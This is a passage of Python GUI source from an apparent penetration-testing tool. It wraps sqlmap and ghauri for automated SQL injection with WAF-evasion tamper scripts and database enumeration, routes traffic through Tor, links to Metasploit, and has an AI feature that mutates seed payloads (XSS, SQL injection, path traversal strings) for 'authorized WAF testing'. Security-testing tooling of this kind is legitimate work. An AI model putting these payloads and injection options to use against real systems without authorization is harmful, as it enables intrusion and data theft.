                    cmd = ['gitleaks', sub, tgt, '-f', 'json', '-r', tmpf.name, '--no-banner', '--exit-code', '0']
                _ap('$ ' + ' '.join(cmd) + '\n')
                run_btn.setEnabled(False); stop_btn.setEnabled(True)
                st['proc'] = self._spawn_tool(page, cmd, _on_out, _on_fin)

            def _stop():
                if st['proc']:
                    st['proc'].kill(); _ap(f'\n[{st["engine"]}] stopped')
            run_btn.clicked.connect(_run); stop_btn.clicked.connect(_stop)
            return page

        def _build_sqli_page(self):
            """sqlmap automated SQL injection (run with the bundled Python)."""
            from PySide6 import QtWidgets
            from PySide6.QtWidgets import (QVBoxLayout, QHBoxLayout, QGridLayout, QLabel,
                QLineEdit, QPushButton, QPlainTextEdit, QSpinBox, QCheckBox, QComboBox)
            import tempfile

            page = QtWidgets.QWidget(); page.setObjectName('SqliPage')
            v = QVBoxLayout(page); v.setContentsMargins(22, 20, 22, 20)
            hdr = QLabel('⛁  SQLi — sqlmap')
            hdr.setStyleSheet('font-size:18px; font-weight:bold; color:#58a6ff;')
            v.addWidget(hdr)
            v.addWidget(QLabel('Automated SQL injection. Runs in --batch (non-interactive). '
                               'Use --tamper for WAF evasion. Only test systems you are authorized to.'))

            g = QGridLayout()
            g.addWidget(QLabel('URL:'), 0, 0)
            url_edit = QLineEdit(); url_edit.setPlaceholderText('http://target/page.php?id=1')
            g.addWidget(url_edit, 0, 1, 1, 3)
            g.addWidget(QLabel('POST data:'), 1, 0)
            data_edit = QLineEdit(); data_edit.setPlaceholderText('(optional) id=1&name=x  → forces POST')
            g.addWidget(data_edit, 1, 1, 1, 3)
            g.addWidget(QLabel('Cookie:'), 2, 0)
            cookie_edit = QLineEdit(); cookie_edit.setPlaceholderText('(optional) PHPSESSID=…')
            g.addWidget(cookie_edit, 2, 1, 1, 3)
            g.addWidget(QLabel('Level:'), 3, 0)
            level_spin = QSpinBox(); level_spin.setRange(1, 5); level_spin.setValue(1); g.addWidget(level_spin, 3, 1)
            g.addWidget(QLabel('Risk:'), 3, 2)
            risk_spin = QSpinBox(); risk_spin.setRange(1, 3); risk_spin.setValue(1); g.addWidget(risk_spin, 3, 3)
            g.addWidget(QLabel('Tamper:'), 4, 0)
            tamper_edit = QLineEdit()
            tamper_edit.setPlaceholderText('WAF bypass scripts — e.g. space2comment,between,randomcase')
            g.addWidget(tamper_edit, 4, 1, 1, 3)
            v.addLayout(g)

            trow = QHBoxLayout()
            rand_chk = QCheckBox('--random-agent'); rand_chk.setChecked(True)
            dbs_chk = QCheckBox('--dbs')
            cur_chk = QCheckBox('current db/user')
            tables_chk = QCheckBox('--tables')
            trow.addWidget(rand_chk); trow.addWidget(dbs_chk); trow.addWidget(cur_chk)
            trow.addWidget(tables_chk); trow.addStretch(); v.addLayout(trow)

            brow = QHBoxLayout()
            brow.addWidget(QLabel('Engine:'))
            engine_combo = QComboBox(); engine_combo.addItems(['sqlmap', 'ghauri'])
            engine_combo.setToolTip('sqlmap: full-featured (tamper/risk). ghauri: faster, fewer requests.')
            brow.addWidget(engine_combo)
            run_btn = QPushButton('▶ Run'); stop_btn = QPushButton('■ Stop'); stop_btn.setEnabled(False)
            tools_btn = QPushButton('⬇ Install engines')
            brow.addWidget(run_btn); brow.addWidget(stop_btn); brow.addStretch(); brow.addWidget(tools_btn)
            v.addLayout(brow)
            summary = QLabel(''); summary.setStyleSheet('color:#22c55e; font-weight:bold;')
            v.addWidget(summary)
            tools_btn.clicked.connect(lambda: self._download_tools_dialog(
                ['sqlmap', 'ghauri'], 'SQL-injection engines.', title='Install SQLi engines'))

            log = QPlainTextEdit(); log.setReadOnly(True)
            log.setStyleSheet('font-family:Consolas,monospace; font-size:12px;')
            v.addWidget(log, 1)

            st = {'proc': None, 'found': []}

            def _ap(s):
                log.appendPlainText(s.rstrip())

            def _on_out():
                p = st['proc']
                if not p:
                    return
                txt = bytes(p.readAllStandardOutput()).decode('utf-8', 'replace')
                _ap(txt)
                for line in txt.splitlines():
                    low = line.lower()
                    if ('is vulnerable' in low or ('parameter' in low and 'vulnerable' in low)
                            or 'back-end dbms:' in low):
                        st['found'].append(line.strip())
                if st['found']:
                    summary.setText(('  ·  '.join(dict.fromkeys(st['found'])))[:400])

            def _on_fin(code=0, status=None):
                run_btn.setEnabled(True); stop_btn.setEnabled(False)
                _ap(f'\n[{st.get("engine", "sqlmap")}] finished (exit {code})')
                if not st['found']:
                    summary.setText('No injection confirmed — try a higher --level/--risk or a --tamper script.')

            def _run():
                from . import recon_install
                eng = engine_combo.currentText(); st['engine'] = eng
                u = url_edit.text().strip()
                if not u:
                    _ap('[!] enter a URL.')
                    return
                env_extra = None
                if eng == 'sqlmap':
                    script = recon_install.sqlmap_script()
                    if not script:
                        self._download_tools_dialog(['sqlmap'], 'sqlmap is needed to test for SQL injection.',
                                                    title='Install sqlmap')
                        script = recon_install.sqlmap_script()
                        if not script:
                            return
                    outdir = tempfile.mkdtemp(prefix='wp_sqlmap_out_')
                    cmd = [sys.executable, script, '-u', u, '--batch', '--disable-coloring',
                           f'--level={level_spin.value()}', f'--risk={risk_spin.value()}',
                           f'--output-dir={outdir}']
                    if tamper_edit.text().strip():
                        cmd += ['--tamper', tamper_edit.text().strip()]
                    if rand_chk.isChecked():
                        cmd.append('--random-agent')
                else:  # ghauri (run as a module from the isolated pylibs dir)
                    if not recon_install.is_installed('ghauri'):
                        self._download_tools_dialog(['ghauri'], 'ghauri is a fast SQLi alternative.',
                                                    title='Install ghauri')
                        if not recon_install.is_installed('ghauri'):
                            return
                    prefix, env_extra = recon_install.python_tool_cmd('ghauri')
                    cmd = list(prefix) + ['-u', u, '--batch', f'--level={level_spin.value()}']
                # shared options (both engines understand these)
                if data_edit.text().strip():
                    cmd += ['--data', data_edit.text().strip()]
                if cookie_edit.text().strip():
                    cmd += ['--cookie', cookie_edit.text().strip()]
                if dbs_chk.isChecked():
                    cmd.append('--dbs')
                if cur_chk.isChecked():
                    cmd += ['--current-db', '--current-user']
                if tables_chk.isChecked():
                    cmd.append('--tables')
                log.clear(); summary.setText(''); st['found'] = []
                _ap('$ ' + ' '.join(cmd) + '\n')
                run_btn.setEnabled(False); stop_btn.setEnabled(True)
                st['proc'] = self._spawn_tool(page, cmd, _on_out, _on_fin, env_extra=env_extra)

            def _stop():
                if st['proc']:
                    st['proc'].kill(); _ap(f'\n[{st.get("engine", "sqlmap")}] stopped')
            run_btn.clicked.connect(_run); stop_btn.clicked.connect(_stop)
            return page

        def _build_ai_page(self):
            """AI provider configuration and safe automation actions."""
            page = QtWidgets.QWidget()
            page.setObjectName('AIPage')
            layout = QVBoxLayout(page)
            layout.setContentsMargins(22, 20, 22, 20)
            layout.setSpacing(14)

            title_row = QHBoxLayout()
            title_box = QVBoxLayout()
            title = QLabel('AI / Automation')
            title.setObjectName('PageTitle')
            subtitle = QLabel('Configure a local or online model, then run scope-aware helper actions.')
            subtitle.setObjectName('FieldLabel')
            title_box.addWidget(title)
            title_box.addWidget(subtitle)
            title_row.addLayout(title_box)
            title_row.addStretch()
            layout.addLayout(title_row)

            prefs = _load_prefs()

            def form_label(text, width=130):
                lbl = QLabel(text)
                lbl.setObjectName('FieldLabel')
                lbl.setMinimumWidth(width)
                lbl.setMaximumWidth(width)
                return lbl

            cfg = QtWidgets.QGroupBox('Provider')
            cfg_layout = QtWidgets.QGridLayout(cfg)
            cfg_layout.setColumnStretch(1, 1)
            provider_combo = QtWidgets.QComboBox()
            provider_combo.addItem('Anthropic Claude', 'anthropic')
            provider_combo.addItem('Ollama local model', 'ollama')
            provider_combo.addItem('OpenAI-compatible endpoint', 'openai-compatible')
            provider_value = prefs.get('ai_provider') or 'anthropic'
            for i in range(provider_combo.count()):
                if provider_combo.itemData(i) == provider_value:
                    provider_combo.setCurrentIndex(i)
                    break
            model_edit = QLineEdit(str(prefs.get('ai_model', '') or ''))
            model_edit.setPlaceholderText('qwen2.5-coder:7b / claude-sonnet-4-6 / model id')
            base_url_edit = QLineEdit(str(prefs.get('ai_base_url', '') or ''))
            base_url_edit.setPlaceholderText('http://127.0.0.1:11434 or https://host/v1')
            key_edit = QLineEdit(str(prefs.get('ai_api_key') or prefs.get('anthropic_api_key') or ''))
            key_edit.setEchoMode(QLineEdit.EchoMode.Password)
            key_edit.setPlaceholderText('optional API key')
            show_key = QCheckBox('show')
            show_key.toggled.connect(lambda on: key_edit.setEchoMode(
                QLineEdit.EchoMode.Normal if on else QLineEdit.EchoMode.Password))
            status_lbl = QLabel('Not checked')
            status_lbl.setObjectName('FieldLabel')
            cfg_layout.addWidget(form_label('Provider'), 0, 0)
            cfg_layout.addWidget(provider_combo, 0, 1, 1, 2)
            cfg_layout.addWidget(form_label('Model'), 1, 0)
            cfg_layout.addWidget(model_edit, 1, 1, 1, 2)
            cfg_layout.addWidget(form_label('Base URL'), 2, 0)
            cfg_layout.addWidget(base_url_edit, 2, 1, 1, 2)
            cfg_layout.addWidget(form_label('API key'), 3, 0)
            cfg_layout.addWidget(key_edit, 3, 1)
            cfg_layout.addWidget(show_key, 3, 2)
            cfg_layout.addWidget(form_label('Status'), 4, 0)
            cfg_layout.addWidget(status_lbl, 4, 1, 1, 2)
            layout.addWidget(cfg)

            actions = QHBoxLayout()
            save_btn = QPushButton('Save')
            test_btn = QPushButton('Test Provider')
            report_btn = QPushButton('Draft Report')
            steps_btn = QPushButton('Suggest Next Steps')
            payload_btn = QPushButton('Payload Ideas')
            actions.addWidget(save_btn)
            actions.addWidget(test_btn)
            actions.addStretch()
            actions.addWidget(report_btn)
            actions.addWidget(steps_btn)
            actions.addWidget(payload_btn)
            layout.addLayout(actions)

            dry_group = QtWidgets.QGroupBox('Safe Dry-Run Planner')
            dry_layout = QtWidgets.QGridLayout(dry_group)
            dry_layout.setColumnStretch(1, 1)
            engagement_combo = QtWidgets.QComboBox()
            engagement_combo.addItem('Select engagement', None)
            if self._db:
                try:
                    for engagement in self._db.list_engagements():
                        engagement_combo.addItem(engagement.get('name', 'Engagement'),
                                                 engagement.get('id'))
                except Exception:
                    pass
            current_eid = prefs.get('current_engagement_id')
            for i in range(engagement_combo.count()):
                if engagement_combo.itemData(i) == current_eid:
                    engagement_combo.setCurrentIndex(i)
                    break
            target_edit = QLineEdit()
            target_edit.setPlaceholderText('https://in-scope.example.com')
            try:
                if self.tree.topLevelItemCount():
                    item = self.tree.topLevelItem(0)
                    target_edit.setText(item.data(0, 256) or item.text(0))
            except Exception:
                pass
            dry_btn = QPushButton('Generate Dry-Run Plan')
            dry_layout.addWidget(form_label('Engagement'), 0, 0)
            dry_layout.addWidget(engagement_combo, 0, 1)
            dry_layout.addWidget(form_label('Target'), 1, 0)
            dry_layout.addWidget(target_edit, 1, 1)
            dry_layout.addWidget(dry_btn, 1, 2)
            layout.addWidget(dry_group)

            output = QTextEdit()
            output.setReadOnly(True)
            output.setPlaceholderText('AI output and automation plans appear here.')
            layout.addWidget(output, 1)

            def provider_args():
                return {
                    'provider': provider_combo.currentData() or 'anthropic',
                    'model': model_edit.text().strip(),
                    'base_url': base_url_edit.text().strip(),
                    'api_key': key_edit.text().strip() or None,
                }

            def save_config():
                args = provider_args()
                p = _load_prefs()
                p['ai_provider'] = args['provider']
                p['ai_model'] = args['model']
                p['ai_base_url'] = args['base_url']
                p['ai_api_key'] = args['api_key'] or ''
                if args['provider'] == 'anthropic':
                    p['anthropic_api_key'] = args['api_key'] or ''
                _save_prefs(p)
                self._prefs = p
                status_lbl.setText('Saved')

            def test_provider():
                save_config()
                try:
                    from .ai_providers import provider_status
                    args = provider_args()
                    st = provider_status(args['provider'], api_key=args['api_key'],
                                         base_url=args['base_url'], model=args['model'])
                    status_lbl.setText('Ready' if st.ready else st.reason or 'Not ready')
                except Exception as e:
                    status_lbl.setText(str(e))

            def current_findings():
                return list(getattr(self, '_results', []) or [])

            def draft_report():
                save_config()
                args = provider_args()
                findings = current_findings()
                if not findings:
                    output.setPlainText('No findings loaded yet. Run/import a scan first.')
                    return
                try:
                    from .ai_providers import write_report
                    text = write_report(args['provider'], 'current Blackthorn workspace',
                                        findings, api_key=args['api_key'],
                                        model=args['model'], base_url=args['base_url'])
                except Exception:
                    text = ''
                if not text:
                    text = self._local_ai_fallback_report(findings)
                output.setPlainText(text)

            def suggest_steps():
                save_config()
                findings = current_findings()
                high = [f for f in findings if str(f.get('severity', '')).upper() in ('CRITICAL', 'HIGH')]
                candidate = [f for f in findings if f.get('workflow_state', 'candidate') == 'candidate']
                lines = [
                    'Next safe automation steps:',
                    '',
                    '1. Confirm the selected engagement scope before any active scan.',
                    '2. Run dry-run planning first, then safe-mode scans only when authorized.',
                    '3. Validate findings manually with the least invasive proof.',
                    '4. Redact tokens, cookies, account data, and unrelated response bodies.',
                ]
                if high:
                    lines.append(f'5. Prioritize {len(high)} critical/high finding(s) for validation.')
                if candidate:
                    lines.append(f'6. Triage {len(candidate)} candidate finding(s) into validated/reported/duplicate states.')
                output.setPlainText('\n'.join(lines))

            def payload_ideas():
                save_config()
                args = provider_args()
                seeds = []
                for f in current_findings():
                    payload = f.get('payload')
                    if payload:
                        seeds.append(str(payload))
                    if len(seeds) >= 10:
                        break
                if not seeds:
                    seeds = ["<script>alert(1)</script>", "' OR '1'='1", "../../etc/passwd"]
                try:
                    from .ai_providers import generate_payload_mutations
                    ideas = generate_payload_mutations(args['provider'], seeds,
                                                       context='authorized WAF testing',
                                                       api_key=args['api_key'],
                                                       model=args['model'],
                                                       base_url=args['base_url'])
                except Exception:
                    ideas = []
                output.setPlainText('\n'.join(f'- {x}' for x in ideas) if ideas
                                    else 'Provider unavailable or returned no payload ideas.')

            def dry_run_plan():
                if not self._db:
                    output.setPlainText('Database is not available.')
                    return
                eid = engagement_combo.currentData()
                target = target_edit.text().strip()
                if not eid or not target:
                    output.setPlainText('Select an engagement and target first.')
                    return
                try:
                    from .agent_server import AgentAPI
                    res = AgentAPI(self._db).handle({
                        'method': 'start_scan',
                        'params': {
                            'engagement_id': eid,
                            'target': target,
                            'dry_run': True,
                            'safe_mode': True,
                            'categories': ['detection_recon', 'info_disclosure'],
                        },
                    })
                    if res.get('ok'):
                        output.setPlainText(res.get('stdout') or 'Dry-run completed.')
                    else:
                        output.setPlainText(f"{res.get('code')}: {res.get('error')}")
                except Exception as e:
                    output.setPlainText(str(e))

            save_btn.clicked.connect(save_config)
            test_btn.clicked.connect(test_provider)
            report_btn.clicked.connect(draft_report)
            steps_btn.clicked.connect(suggest_steps)
            payload_btn.clicked.connect(payload_ideas)
            dry_btn.clicked.connect(dry_run_plan)
            return page

        def _local_ai_fallback_report(self, findings):
            rows = list(findings or [])
            lines = ['# Blackthorn Report Draft', '', '## Summary',
                     f'- Findings reviewed: {len(rows)}',
                     '- AI provider was unavailable; this is a local structured draft.',
                     '', '## Findings']
            for f in rows[:50]:
                lines.append(f"- {f.get('severity', 'INFO')}: {f.get('technique', 'Finding')} "
                             f"({f.get('workflow_state', 'candidate')})")
            return '\n'.join(lines) + '\n'

        def _build_settings_page(self):
            try:
                dlg = QtWidgets.QWidget()
                dlg.setObjectName('SettingsPage')
                layout = QtWidgets.QVBoxLayout(dlg)
                layout.setContentsMargins(22, 20, 22, 20)

                try:
                    prefs = _load_prefs()
                except Exception:
                    prefs = {}

                def form_label(text, width=170):
                    lbl = QLabel(text)
                    lbl.setObjectName('FieldLabel')
                    lbl.setMinimumWidth(width)
                    lbl.setMaximumWidth(width)
                    return lbl

                # font size
                h2 = QtWidgets.QHBoxLayout()
                h2.addWidget(form_label(_t('font_size', self._lang)))
                font_spin = QSpinBox()
                font_spin.setFixedWidth(90)
                font_spin.setRange(8, 20)
                try:
                    font_spin.setValue(int(prefs.get('font_size', 11)))
                except Exception:
                    font_spin.setValue(11)
                h2.addWidget(font_spin)
                h2.addStretch()
                layout.addLayout(h2)

                # watermark
                wm_chk = QCheckBox(_t('show_watermark', self._lang))
                try:
                    wm_chk.setChecked(bool(prefs.get('watermark', True)))
                except Exception:
                    wm_chk.setChecked(True)
                layout.addWidget(wm_chk)

                # remember targets
                remember_chk = QCheckBox(_t('remember_targets', self._lang))
                try:
                    remember_chk.setChecked(bool(prefs.get('remember_targets', True)))
                except Exception:
                    remember_chk.setChecked(True)
                layout.addWidget(remember_chk)

                # retry failed
                retry_layout = QtWidgets.QHBoxLayout()
                retry_layout.addWidget(form_label(_t('retry_failed', self._lang)))
                retry_spin = QSpinBox()
                retry_spin.setFixedWidth(90)
                retry_spin.setRange(0, 5)
                try:
                    retry_spin.setValue(int(prefs.get('retry_failed', 0)))
                except Exception:
                    retry_spin.setValue(0)
                retry_layout.addWidget(retry_spin)
                retry_layout.addStretch()
                layout.addLayout(retry_layout)

                # UI density
                density_layout = QtWidgets.QHBoxLayout()
                density_layout.addWidget(form_label(_t('ui_density', self._lang)))
                density_combo = QtWidgets.QComboBox()
                density_combo.addItems([_t('compact', self._lang), _t('comfortable', self._lang), _t('spacious', self._lang)])
                try:
                    current_density = prefs.get('ui_density', 'comfortable')
                    density_map = {'compact': 0, 'comfortable': 1, 'spacious': 2}
                    density_combo.setCurrentIndex(density_map.get(current_density, 1))
                except Exception:
                    pass
                density_layout.addWidget(density_combo)
                density_layout.addStretch()
                layout.addLayout(density_layout)

                # Language selection
                lang_layout = QtWidgets.QHBoxLayout()
                lang_layout.addWidget(form_label(_t('language')))
                lang_combo = QtWidgets.QComboBox()
                for code, name in LANGUAGE_NAMES.items():
                    lang_combo.addItem(name, code)
                try:
                    current_lang = prefs.get('language', 'en')
                    idx = list(LANGUAGE_NAMES.keys()).index(current_lang)
                    lang_combo.setCurrentIndex(idx)
                except Exception:
                    lang_combo.setCurrentIndex(0)
                lang_layout.addWidget(lang_combo)
                lang_layout.addStretch()
                layout.addLayout(lang_layout)
                
                # Note about language change - updates dynamically when language selection changes
                lang_note = QLabel(_t('lang_restart_warning'))
                lang_note.setStyleSheet('color: #888; font-size: 10px;')
                layout.addWidget(lang_note)
                
                # Update warning text when language selection changes
                def _update_lang_warning():
                    selected_lang = lang_combo.currentData()
                    lang_note.setText(_t('lang_restart_warning', selected_lang))
                
                lang_combo.currentIndexChanged.connect(_update_lang_warning)
                
                # ========== PROXY SETTINGS ==========
                proxy_group = QtWidgets.QGroupBox(_t('proxy_settings', self._lang) if 'proxy_settings' in TRANSLATIONS.get(self._lang, {}) else '🌐 Proxy Settings')
                proxy_layout = QVBoxLayout(proxy_group)
                
                # Use proxy checkbox
                use_proxy_chk = QCheckBox(_t('use_proxy', self._lang) if 'use_proxy' in TRANSLATIONS.get(self._lang, {}) else 'Use Proxy')
                try:
                    use_proxy_chk.setChecked(bool(prefs.get('use_proxy', False)))
                except Exception:
                    use_proxy_chk.setChecked(False)
                proxy_layout.addWidget(use_proxy_chk)
                
                # Proxy type selection
                proxy_type_layout = QHBoxLayout()
                proxy_type_layout.addWidget(form_label(_t('proxy_type', self._lang) if 'proxy_type' in TRANSLATIONS.get(self._lang, {}) else 'Type:'))
                proxy_type_combo = QtWidgets.QComboBox()
                proxy_type_combo.addItems([
                    '🧅 Tor (SOCKS5 - 127.0.0.1:9050)',
                    '🧅 Tor Browser (SOCKS5 - 127.0.0.1:9150)',
                    '🔧 Burp Suite (HTTP - 127.0.0.1:8080)',
                    '🔗 Custom Proxy'
                ])
                try:
                    proxy_type_combo.setCurrentIndex(prefs.get('proxy_type_idx', 0))
                except Exception:
                    pass
                proxy_type_layout.addWidget(proxy_type_combo)
                proxy_type_layout.addStretch()
                proxy_layout.addLayout(proxy_type_layout)
                
                # Custom proxy fields
                custom_proxy_widget = QtWidgets.QWidget()
                custom_proxy_layout = QVBoxLayout(custom_proxy_widget)
                custom_proxy_layout.setContentsMargins(0, 0, 0, 0)
                
                host_layout = QHBoxLayout()
                host_layout.addWidget(form_label(_t('proxy_host', self._lang) if 'proxy_host' in TRANSLATIONS.get(self._lang, {}) else 'Host:'))
                proxy_host_edit = QLineEdit()
                proxy_host_edit.setPlaceholderText('127.0.0.1')
                try:
                    proxy_host_edit.setText(prefs.get('proxy_host', '127.0.0.1'))
                except Exception:
                    pass
                host_layout.addWidget(proxy_host_edit)
                host_layout.addStretch()
                custom_proxy_layout.addLayout(host_layout)
                
                port_layout = QHBoxLayout()
                port_layout.addWidget(form_label(_t('proxy_port', self._lang) if 'proxy_port' in TRANSLATIONS.get(self._lang, {}) else 'Port:'))
                proxy_port_spin = QSpinBox()
                proxy_port_spin.setFixedWidth(110)
                proxy_port_spin.setRange(1, 65535)
                try:
                    proxy_port_spin.setValue(int(prefs.get('proxy_port', 9050)))
                except Exception:
                    proxy_port_spin.setValue(9050)
                port_layout.addWidget(proxy_port_spin)
                port_layout.addStretch()
                custom_proxy_layout.addLayout(port_layout)
                
                proxy_layout.addWidget(custom_proxy_widget)
                
                # Show/hide custom fields based on selection
                def update_proxy_fields():
                    idx = proxy_type_combo.currentIndex()
                    custom_proxy_widget.setVisible(idx == 3)  # Only show for custom
                    # Update default values for known proxies
                    if idx == 0:  # Tor
                        proxy_host_edit.setText('127.0.0.1')
                        proxy_port_spin.setValue(9050)
                    elif idx == 1:  # Tor Browser
                        proxy_host_edit.setText('127.0.0.1')
                        proxy_port_spin.setValue(9150)
                    elif idx == 2:  # Burp
                        proxy_host_edit.setText('127.0.0.1')
                        proxy_port_spin.setValue(8080)
                
                proxy_type_combo.currentIndexChanged.connect(update_proxy_fields)
                update_proxy_fields()
                
                layout.addWidget(proxy_group)
                
                # ========== FORENSICS SETTINGS ==========
                forensics_group = QtWidgets.QGroupBox(_t('forensics_settings', self._lang) if 'forensics_settings' in TRANSLATIONS.get(self._lang, {}) else '🔬 Forensics & Analysis')
                forensics_layout = QVBoxLayout(forensics_group)
                
                # HTTP Logging checkbox
                http_log_chk = QCheckBox(_t('enable_http_logging', self._lang) if 'enable_http_logging' in TRANSLATIONS.get(self._lang, {}) else '📝 Enable HTTP Request/Response Logging')
                http_log_chk.setToolTip(_t('http_logging_tooltip', self._lang) if 'http_logging_tooltip' in TRANSLATIONS.get(self._lang, {}) else 'Capture full HTTP requests and responses for forensic analysis')
                try:
                    http_log_chk.setChecked(bool(prefs.get('enable_http_logging', False)))
                except Exception:
                    http_log_chk.setChecked(False)
                forensics_layout.addWidget(http_log_chk)
                
                # SSL/TLS Analysis checkbox
                ssl_analysis_chk = QCheckBox(_t('enable_ssl_analysis', self._lang) if 'enable_ssl_analysis' in TRANSLATIONS.get(self._lang, {}) else '🔐 Enable SSL/TLS Certificate Analysis')
                ssl_analysis_chk.setToolTip(_t('ssl_analysis_tooltip', self._lang) if 'ssl_analysis_tooltip' in TRANSLATIONS.get(self._lang, {}) else 'Analyze SSL certificates, cipher suites, and detect security issues')
                try:
                    ssl_analysis_chk.setChecked(bool(prefs.get('enable_ssl_analysis', False)))
                except Exception:
                    ssl_analysis_chk.setChecked(False)
                forensics_layout.addWidget(ssl_analysis_chk)
                
                layout.addWidget(forensics_group)
                
                # ========== PRIVACY SETTINGS ==========
                privacy_group = QtWidgets.QGroupBox('🔒 Privacy Settings')
                privacy_layout = QVBoxLayout(privacy_group)
                
                # Censor sites checkbox
                censor_sites_chk = QCheckBox('🙈 Censor Site URLs (hide sensitive domains)')
                censor_sites_chk.setToolTip('When enabled, site URLs will be partially masked (e.g., ex***le.com) for screenshots or screen sharing')
                try:
                    censor_sites_chk.setChecked(bool(prefs.get('censor_sites', False)))
                except Exception:
                    censor_sites_chk.setChecked(False)
                privacy_layout.addWidget(censor_sites_chk)
                
                layout.addWidget(privacy_group)

                # ========== AI SETTINGS SHORTCUT ==========
                ai_group = QtWidgets.QGroupBox('AI shortcut')
                ai_layout = QVBoxLayout(ai_group)
                ai_layout.addWidget(QLabel(
                    'Full provider setup and automation actions live in AI / Automation. '
                    'This shortcut keeps legacy Claude key/model fields available.'))
                key_row = QtWidgets.QHBoxLayout()
                key_row.addWidget(QLabel('API key:'))
                ai_key_edit = QLineEdit()
                ai_key_edit.setEchoMode(QLineEdit.EchoMode.Password)
                ai_key_edit.setPlaceholderText('sk-ant-…')
                try:
                    ai_key_edit.setText(str(prefs.get('anthropic_api_key', '') or ''))
                except Exception:
                    pass
                show_key_chk = QCheckBox('show')
                show_key_chk.toggled.connect(
                    lambda on: ai_key_edit.setEchoMode(
                        QLineEdit.EchoMode.Normal if on else QLineEdit.EchoMode.Password))
                key_row.addWidget(ai_key_edit, 1)
                key_row.addWidget(show_key_chk)
                ai_layout.addLayout(key_row)
                model_row = QtWidgets.QHBoxLayout()
                model_row.addWidget(QLabel('Model:'))
                ai_model_edit = QLineEdit()
                ai_model_edit.setPlaceholderText('default or model id')
                try:
                    ai_model_edit.setText(str(prefs.get('ai_model', '') or ''))
                except Exception:
                    pass
                model_row.addWidget(ai_model_edit, 1)
                ai_layout.addLayout(model_row)
                layout.addWidget(ai_group)

                # ========== INTEGRATIONS (Metasploit + Caido) ==========
                integ_group = QtWidgets.QGroupBox('🧩 Integrations — Metasploit & Caido')
                integ_layout = QVBoxLayout(integ_group)
                integ_layout.addWidget(QLabel(
                    'Used by the Recon section ("Send to …") and the msf/caido CLI. '
                    'The Metasploit password is stored locally and passed via the '
                    'MSF_RPC_PASSWORD environment variable, never on the command line.'))

                # -- Metasploit RPC --
                integ_layout.addWidget(QLabel('Metasploit (msfrpcd):'))
                msf_row = QtWidgets.QHBoxLayout()
                msf_row.addWidget(QLabel('Host:'))
                msf_host_edit = QLineEdit(); msf_host_edit.setPlaceholderText('127.0.0.1')
                msf_host_edit.setText(str(prefs.get('msf_host', '127.0.0.1') or '127.0.0.1'))
                msf_row.addWidget(msf_host_edit, 1)
                msf_row.addWidget(QLabel('Port:'))
                msf_port_spin = QSpinBox(); msf_port_spin.setRange(1, 65535)
                try:
                    msf_port_spin.setValue(int(prefs.get('msf_port', 55553)))
                except Exception:
                    msf_port_spin.setValue(55553)
                msf_row.addWidget(msf_port_spin)
                integ_layout.addLayout(msf_row)

                msf_row2 = QtWidgets.QHBoxLayout()
                msf_row2.addWidget(QLabel('Password:'))
                msf_pw_edit = QLineEdit(); msf_pw_edit.setEchoMode(QLineEdit.EchoMode.Password)
                msf_pw_edit.setText(str(prefs.get('msf_password', '') or ''))
                msf_show = QCheckBox('show')
                msf_show.toggled.connect(lambda on: msf_pw_edit.setEchoMode(
                    QLineEdit.EchoMode.Normal if on else QLineEdit.EchoMode.Password))
                msf_row2.addWidget(msf_pw_edit, 1)
                msf_row2.addWidget(msf_show)
                msf_row2.addWidget(QLabel('Workspace:'))
                msf_ws_edit = QLineEdit(); msf_ws_edit.setPlaceholderText('blackthorn')
                msf_ws_edit.setText(str(prefs.get('msf_workspace', 'blackthorn') or 'blackthorn'))
                msf_row2.addWidget(msf_ws_edit)
                integ_layout.addLayout(msf_row2)

                msf_nossl_chk = QCheckBox('RPC without SSL (msfrpcd started with -S)')
                msf_nossl_chk.setChecked(bool(prefs.get('msf_no_ssl', False)))
                integ_layout.addWidget(msf_nossl_chk)

                # -- Caido --
                integ_layout.addWidget(QLabel('Caido:'))
                caido_row = QtWidgets.QHBoxLayout()
                caido_row.addWidget(QLabel('Proxy URL:'))
                caido_proxy_edit = QLineEdit(); caido_proxy_edit.setPlaceholderText('http://127.0.0.1:8080')
                caido_proxy_edit.setText(str(prefs.get('caido_proxy_url', 'http://127.0.0.1:8080')
                                             or 'http://127.0.0.1:8080'))
                caido_row.addWidget(caido_proxy_edit, 1)
                integ_layout.addLayout(caido_row)

                caido_route_chk = QCheckBox('Route scans through Caido (proxy passthrough)')
                caido_route_chk.setChecked(bool(prefs.get('caido_route_scans', False)))
                integ_layout.addWidget(caido_route_chk)

                layout.addWidget(integ_group)

                # ========== SCAN PROFILE (export / import) ==========
                profile_group = QtWidgets.QGroupBox('🗂️ Scan Profile')
                profile_layout = QVBoxLayout(profile_group)
                profile_layout.addWidget(QLabel(
                    'Save your scan setup (threads, delay, categories, proxy, advanced '
                    'options) to a JSON file you can re-import or share. The API key is '
                    'never included.'))
                prof_btns = QtWidgets.QHBoxLayout()
                export_cfg_btn = QPushButton('⬇ Export Profile…')
                import_cfg_btn = QPushButton('⬆ Import Profile…')
                prof_btns.addWidget(export_cfg_btn)
                prof_btns.addWidget(import_cfg_btn)
                profile_layout.addLayout(prof_btns)
                layout.addWidget(profile_group)

                def _export_profile():
                    try:
                        path, _ = QFileDialog.getSaveFileName(
                            dlg, 'Export scan profile', 'blackthorn-profile.json',
                            'JSON files (*.json)')
                        if not path:
                            return
                        with open(path, 'w', encoding='utf-8') as f:
                            json.dump(profile_from_prefs(_load_prefs()), f, indent=2)
                        QMessageBox.information(dlg, 'Profile exported', f'Saved to:\n{path}')
                    except Exception as e:
                        QMessageBox.warning(dlg, 'Export failed', str(e))

                def _import_profile():
                    try:
                        path, _ = QFileDialog.getOpenFileName(
                            dlg, 'Import scan profile', '', 'JSON files (*.json)')
                        if not path:
                            return
                        with open(path, 'r', encoding='utf-8') as f:
                            data = json.load(f)
                        prefs2 = merge_profile(_load_prefs(), data)
                        _save_prefs(prefs2)
                        self._prefs = prefs2
                        QMessageBox.information(
                            dlg, 'Profile imported',
                            'Imported. Re-open Settings / the scan dialog to see the '
                            'restored values.')
                    except Exception as e:
                        QMessageBox.warning(dlg, 'Import failed', str(e))

                export_cfg_btn.clicked.connect(_export_profile)
                import_cfg_btn.clicked.connect(_import_profile)

                btn_h = QtWidgets.QHBoxLayout()
                save_btn = QPushButton(_t('save'))
                cancel_btn = QPushButton(_t('cancel'))
                btn_h.addWidget(save_btn)
                btn_h.addWidget(cancel_btn)
                layout.addLayout(btn_h)

                def _save_qt():
                    try:
                        old_lang = _normalize_language(prefs.get('language', 'en'))
                        new_lang = _normalize_language(lang_combo.currentData())
                        
                        prefs['font_size'] = int(font_spin.value())
